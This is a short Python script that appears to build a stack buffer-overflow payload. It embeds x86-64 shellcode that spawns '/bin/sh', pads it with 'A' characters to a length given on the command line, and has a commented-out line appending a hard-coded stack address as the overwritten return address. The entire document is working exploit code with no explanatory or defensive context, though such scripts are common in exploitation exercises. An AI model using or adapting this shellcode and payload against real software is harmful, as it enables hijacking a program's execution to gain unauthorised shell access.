
import sys
import struct




if __name__ == '__main__':

    shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
    start = int(sys.argv[1])
    eip = 0x7ffc9d8ed480
    data = (shellcode + 'A' * (start - 1 - len(shellcode))).encode('utf-8')
    #data = data + struct.pack('Q',eip)
    print(data)

